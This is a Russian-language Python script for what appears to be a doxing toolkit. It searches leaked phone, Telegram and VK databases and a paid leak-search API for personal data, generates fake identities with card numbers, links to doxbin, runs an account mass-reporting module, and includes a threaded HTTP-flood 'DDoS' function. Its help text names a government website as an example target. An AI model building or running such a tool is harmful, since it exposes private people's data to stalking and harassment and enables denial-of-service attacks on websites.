import csv
import json
import urllib
import os
import webbrowser
import platform


#Импортирование необходимых библиотек, если их нету, то программа вызывает ошибку
try:
    import whois
    import sys
    import colorama
    from colorama import Fore, Style
    import pystyle
    import requests
    import bs4
    import os
    import time
    import random
    import webbrowser
    import faker
    from faker import Faker
    import ctypes
    from ctypes import wintypes
    import threading
except:
    downloader = input("У вас не установлены все библиотеки. Установить? y/n ")
    if downloader == 'y':
        os.system("pip install requiments")
    if downloader == 'n':
        sys.exit()
#Импорт других кодов
# Импорт локальных модулей
from src12.banner import *
from src12.number_osint import *
from src12.id_checker import *
from src12.vk_osint import *
from src12.snos_banner import *


red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN
white = Fore.WHITE
yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT

#Изменение окна

hWnd = ctypes.windll.kernel32.GetConsoleWindow()

user32 = ctypes.windll.user32
screenWidth = user32.GetSystemMetrics(0)
screenHeight = user32.GetSystemMetrics(1)
rect = wintypes.RECT()
ctypes.windll.user32.GetWindowRect(hWnd, ctypes.pointer(rect))

windowWidth = rect.right - rect.left
windowHeight = rect.bottom - rect.top

newX = int((screenWidth - windowWidth) / 2)
newY = int((screenHeight - windowHeight) / 2)

ctypes.windll.user32.MoveWindow(hWnd, newX, newY, windowWidth, windowHeight, True)


def main():
    print(banner)
    select = input(f'{yellow}[{white}!{yellow}] {blue}Выберите пункт -> ')

    if select not in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "/help", "/debug", "/join", "/part 2", "11"]:
        print(f'{yellow}[{white}!{yellow}] {blue}Не верный пункт!')
        os.system('clear')
        main()
    elif select == '1':
        phone_search1()
    elif select == '2':
        ip_search()
    elif select == '3':
        id_checks(id_bd='basedata/Telegram.csv', id_input=None)
    elif select == '4':
        user_check()
    elif select == '5':
        fake_generation()
    elif select == '6':
        vkontakte_search()
    elif select == '7':
        link_search()
    elif select == '8':
        ddos_attack()
    elif select == '9':
        osint_search()
    elif select == '10':
        snosing()
    elif select == '11':  # Исправленный пункт
        whoisIPinfo()
    elif select == '/join':
        webbrowser.open("doxxing_instruments.t.me")
    elif select == '/debug':
        debug()
    elif select == '/help':
        help_message()
    elif select == '/part 2':
        print(f"{blue}Ожидается в новой версии, ожидайте!")
        main()

def phone_search1():
    phone1 = input(f'{yellow}[{white}!{yellow}] {blue}Введите номер телефона-> ')
    print(f'{yellow}[{white}!{yellow}] {blue}Поиск..')
    bd = 'basedata/EYEOFGOD.csv'
    bd1 = 'basedata/part1.csv'
    bd2 = 'basedata/part2.csv'
    bd3 = 'basedata/part3.csv'
    bd4 = 'basedata/part4.csv'
    bd5 = 'basedata/part5.csv'
    bd6 = 'basedata/part6.csv'
    bd7 = 'basedata/getcontact.csv'
    phone_search1(bd, bd1, bd2, bd3, bd4, bd5, bd6, bd7, phone1)
    input("Enter для выхода")
    main()


def ip_search():
    getIP = input(f'{yellow}[{white}!{yellow}] {blue}Введите IP -> ')
    url = "https://ipinfo.io/" + getIP + "/json"

    try:
        # Отправляем запрос и получаем ответ
        response = urllib.request.urlopen(url)
        # Преобразуем ответ в JSON
        data = json.loads(response.read())

        # Выводим информацию
        print(Fore.BLUE + "┌IP: ", data.get("ip", "Неизвестно"))
        print(Fore.BLUE + "│Город: ", data.get("city", "Неизвестно"))
        print(Fore.BLUE + "│Регион: ", data.get("region", "Неизвестно"))
        print(Fore.BLUE + "│Страна: ", data.get("country", "Неизвестно"))
        print(Fore.BLUE + "│Временная зона: ", data.get("timezone", "Неизвестно"))
        print(Fore.BLUE + "│Координаты: ", data.get("loc", "Неизвестно"))
        print(Fore.BLUE + "└Название хоста: ", data.get("hostname", "Неизвестно"))

        input(f"{green}Нажмите Enter для возврата")
        main()  # Возврат в главное меню

    except urllib.error.HTTPError as e:
        print(f'{yellow}[{white}!{yellow}] {blue}Ошибка HTTP: {e.code}')
        input(f"{green}Нажмите Enter для возврата")
        main()  # Возврат в главное меню
    except Exception as e:
        print(f'{yellow}[{white}!{yellow}] {blue}IP не найдено! Ошибка: {e}')
        input(f"{green}Нажмите Enter для возврата")
        main()  # Возврат в главное меню

def whoisIPinfo():
    import whois
    domain_name = input("Введите доменное имя: ")
    try:
        # Получаем информацию о домене
        w = whois.whois(domain_name)

        # Выводим информацию
        print(Fore.BLUE + "┌Домен: ", w.domain_name if w.domain_name else "Неизвестно")
        print(Fore.BLUE + "│Дата создания: ", w.creation_date if w.creation_date else "Неизвестно")
        print(Fore.BLUE + "│Дата обновления: ", w.updated_date if w.updated_date else "Неизвестно")
        print(Fore.BLUE + "│Дата истечения: ", w.expiration_date if w.expiration_date else "Неизвестно")
        print(Fore.BLUE + "│Регистратор: ", w.registrar if w.registrar else "Неизвестно")
        print(Fore.BLUE + "│DNS-серверы: ", w.name_servers if w.name_servers else "Неизвестно")
        print(Fore.BLUE + "└Email: ", w.emails if w.emails else "Неизвестно")
        input(f"{green}Нажмите Enter для возврата")
        main()
    except Exception as e:
        print(Fore.RED + f"Ошибка при получении данных: {e}")
        input(f"{green}Нажмите Enter для возврата")
        main()

def fake_generation():
    fake = Faker("")
    print(Fore.BLUE + f"""
      [Фейк информация]

    Ф.И.О - {fake.name()}
    Дата рождения - {fake.date()}
    Адрес - {fake.address()}
    Номер -  +7919{fake.random_number(digits=7)}
    Провайдер - {fake.credit_card_provider()}
    Номер - {fake.credit_card_number()}
    Срок действия - {fake.credit_card_expire()}
    Код безопасности - {fake.credit_card_security_code()}
    MAC Adress - {fake.hexify(text='MAC Address: ^^:^^:^^:^^:^^:^^')}
    IPv4 - {fake.ipv4_private()}
    """)
    input(f"{green}Нажмите Enter для возврата")
    main()

def id_checks(id_bd, id_input):
    id_bd = 'basedata/Telegram.csv'  # Путь к базе данных
    id_input = input(f'{yellow}[{white}!{yellow}] {blue}Введите ID -> ')  # Ввод ID

    def check_file(encoding):
        try:
            with open(id_bd, newline='', encoding=encoding) as csvfile:
                reader = csv.reader(csvfile)
                found = False
                for row in reader:
                    if id_input in row:  # Проверяем, есть ли ID в строке
                        print(f'{green}[{white}+{green}] {blue}ID найден в базе данных: {row}')  # Выводим найденную строку
                        found = True
                        input(f"{green}Нажмите Enter для возврата")
                        main()
                if not found:
                    print(f'{red}[{white}-{red}] {blue}ID не найден.')
                    input(f"{green}Нажмите Enter для возврата")
                    main()
        except UnicodeDecodeError:
            return False
        return True

    # Сначала пробуем открыть файл с кодировкой UTF-8
    if not check_file('utf-8'):
        # Если возникла ошибка декодирования, пробуем Windows-1251
        if not check_file('windows-1251'):
            print(f'{red}[{white}-{red}] {blue}Не удалось открыть файл ни с UTF-8, ни с Windows-1251.')

def user_check():
    id_bd = 'basedata/Telegram.csv'  # Путь к базе данных
    username_input = input(f'{yellow}[{white}!{yellow}] {blue}Введите username (без @) ->  ')  # Ввод ID

    def check_file(encoding):
        try:
            with open(id_bd, newline='', encoding=encoding) as csvfile:
                reader = csv.reader(csvfile)
                found = False
                for row in reader:
                    if username_input in row:  # Проверяем, есть ли ID в строке
                        print(f'{green}[{white}+{green}] {blue}Username найден в базе данных: {row}')  # Выводим найденную строку
                        found = True
                        input(f"{green}Нажмите Enter для возврата")
                        main()
                if not found:
                    print(f'{red}[{white}-{red}] {blue}Username не найден.')
                    input(f"{green}Нажмите Enter для возврата")
                    main()
        except UnicodeDecodeError:
            return False
        return True

    # Сначала пробуем открыть файл с кодировкой UTF-8
    if not check_file('utf-8'):
        # Если возникла ошибка декодирования, пробуем Windows-1251
        if not check_file('windows-1251'):
            print(f'{red}[{white}-{red}] {blue}Не удалось открыть файл ни с UTF-8, ни с Windows-1251.')

def popi():
    url = "https://t.me/+nZQj5phVPZtlZGI0"
    if 'termux' in platform.platform().lower():
        os.system(f'termux-open-url {url}')
    elif os.name == 'nt':
        webbrowser.open(url)
    else:
        print("Неподдерживаемая платформа.")

def vkontakte_search():
    bd22 = ['basedata/DNS0.csv', 'basedata/DNS1.csv', 'basedata/DNS2.csv']  # Список баз данных
    vk_ids = input(f'{yellow}[{white}!{yellow}] {blue}Введите VKID -> ').strip().lower()  # Убираем лишние пробелы и приводим к нижнему регистру

    found = False  # Флаг для отслеживания, найден ли VK ID

    for bd_path in bd22:
        try:
            with open(bd_path, newline='', encoding='utf-8') as csvfile:
                reader = csv.reader(csvfile, delimiter=';')
                for row in reader:
                    # Приведение каждой строки из базы данных к нижнему регистру и убирание лишних пробелов
                    cleaned_row = [item.strip().lower() for item in row]
                    #print(f'Проверяем строку: {cleaned_row}')  # Отладочный вывод
                    if vk_ids in cleaned_row:  # Проверяем, есть ли VKID в строке
                        print(f'{green}[{white}+{green}] {blue}VK ID найден в базе данных {bd_path}: {row}')  # Выводим найденную строку
                        found = True  # Устанавливаем флаг
                        input(f"{green}Нажмите Enter для возврата")
                        break  # Выходим из цикла, если VK ID найден
                if found:
                    break  # Если VK ID найден, выходим из цикла по базам данных
        except Exception as e:
            print(f"{red}[{white}-{red}] {blue}Ошибка при чтении файла {bd_path}: {e}")

    if not found:
        print(f'{red}[{white}-{red}] {blue}VK ID не найден в ни одной из баз данных.')
        input(f"{green}Нажмите Enter для возврата")

    main()  # Возврат в главное меню


def link_search():
    search_count = input(f'{yellow}[{white}!{yellow}] {blue}Введите данные для поиска -> ')
    links_count = [f'https://t.me/{search_count}',
                   f'https://vk.com/{search_count}',
                   f'https://ok.ru/profile/{search_count}',
                   f'https://doxbin.org/upload/{search_count}',
                   f'https://yandex.ru/search/?text={search_count}']
    print(f'{yellow}[{white}!{yellow}] {blue} Проверяй эти ссылки -> \n{links_count}')
    input(f"{green}Нажмите Enter для возврата")
    main()

def ddos_attack():
    from src12 import ddos_banner
    print(ddos_banner)
    choice = input(f'{yellow}[{white}!{yellow}] {blue}Выберите пункт -> ')
    if choice not in ["1", "2", "3"]:
        print(f"{red}Не правильно!")
        os.system('clear')
        ddos_attack()
    if choice == '1':
        print(f"{red}Не придумали еще, куда ты лезешь?")
        os.system('clear')
        ddos_attack()
    elif choice == '2':
        url = input(f'{yellow}[{white}!{yellow}] {blue}Введите ссылку (начиная с http:) -> ')
        num_requests = int(input(f'{yellow}[{white}!{yellow}] {blue}Введите количество запросов на сайт -> '))

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
        ]

        def send_request(i):
            user_agent = random.choice(user_agents)
            headers = {'User-Agent': user_agent}

            try:
                response = requests.get(url, headers=headers, timeout=0.1)
                print(f"Request {i} sent successfully\n")
            except:
                print(f"Request {i} sent successfully\n")

        threads = []
        for i in range(1, num_requests + 1):
            t = threading.Thread(target=send_request, args=[i])
            t.start()
            threads.append(t)

        for t in threads:
            t.join()
        ddos_attack()
    elif choice == '3':
        main()
def osint_search():
    try:
        API = input("Введите свой API ключ для поиска (его можно взять в боте https://t.me/Pr0bivator_bot в настройках):")
        def Search(Term):
            def make_request(Term):
                data = {"token": API, "request": Term, "limit": 100, "lang": "ru"}
                url = 'https://server.leakosint.com/'
                response = requests.post(url, json=data)
                return response.json()

            data = make_request(Term)
            for source in data["List"]:
                if source == "No results found":
                    print(Fore.RED + "[!] Ничего не найдено")
                print(Fore.RED + f"\n[!] База данных -> ")
                print(Fore.RED + f"{source}\n")
                for item in data["List"][source]["Data"]:
                    if str(item) in set():
                        continue
                    for key, value in item.items():
                        print(Fore.RED + f"[+] {key} -> ")
                        print(Fore.RED + f"{value}\n")
            if "No results found" not in data["List"]:
                print()
                print(Fore.RED + "====== R E S U L T ====\n")
                print(Fore.RED + "O N I O N\n")
                print(Fore.RED + "====== R E S U L T ====")
                a = input("Enter для возврата в меню")
                main()

        Term = input(f'{yellow}[{white}!{yellow}] {blue}Введите данные для поиска -> ')
        Search(Term)
    except KeyError:
        print(f"{red}Сервер не вернул информацию, ниже возможные причины\n{white}1. Вы ввели не верный API ключ\n{white}2. Вы ввели неправильно номер\n{white}3. Сервер сейчас недоступен, попробуйте через час")
        input(f"{green}Нажмите Enter для возврата")
        main()

def snosing():
    from src12.snos import advention
    advention()


def debug():
    os.system("pip install requiments")

def help_message():
    hlp_messg = '''
    ++++++++++++++Меню Помощи+++++++++++++++++
    + 1. Телефон
    + 2. Как добавить Базу данных
    + 3. Тг
    + 4. IP 
    + 5. DDOS
    00 - Назад в меню
    +++++++++++++++++++++++++++++++++++++++++++
    '''
    print(f"{blue}{hlp_messg}")
    hlp_choice = input(f'{yellow}[{white}!{yellow}] {blue}Выберай -> ')
    if hlp_choice not in ['1','2','3','4','5']:
        print(f"{red}Не понимаю вас")
    elif hlp_choice == '1':
        print(f"{red}Номер телефона можно вводить любым способом. \n Примеры: +79000000000; 79000000000; 89000000000 \n Если программа ничего не выдает то попробуйте эти три способа!")
        time.sleep(2)
        main()
    elif hlp_choice == '2':
        print(f"{red}Как добавить базу данных?. \n Все очень просто! Для начала вам нужна база формата .csv \n Потом заходите в код программы > number > там добавляйте новые строчки, выберайте кодировку \n Далее заходим в главный код и добавляем функцию и указываем путь к базе.")
        time.sleep(2)
        main()
    elif hlp_choice == '3':
        print(f"{red}Юзернейм телеграмм вводите без @. \n Пример: ebanat228338; xuy123;")
        time.sleep(2)
        main()
    elif hlp_choice == '4':
        print(f"{red}IP вводить только цифрами. \n Пример: 228.228.28.228 и тд")
        time.sleep(2)
        main()
    elif hlp_choice == '5':
        time.sleep(2)
        main()
        print(f"{red}В поле с DDos атакой просто введите URL сайта! \n Пример: https://mvd.ru")

if __name__ == '__main__':
    popi()
    main()